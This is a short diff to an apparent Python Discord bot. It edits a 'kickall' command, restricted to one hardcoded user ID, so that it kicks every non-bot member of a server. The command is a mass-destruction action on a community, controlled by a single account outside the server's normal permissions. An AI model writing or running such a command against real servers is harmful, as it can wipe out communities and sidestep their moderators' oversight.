@@ -172,7 +172,8 @@ async def unban(ctx, user: discord.User):
 async def kickall(ctx):
     if ctx.message.author.id == 441986625283686413:
         for m in ctx.guild.members:
-            await m.kick(reason=None)
+            if m.bot ==  False:
+                await m.kick(reason=None)
 
 @bot.command(pass_context  = True)
 async def dbd(ctx):
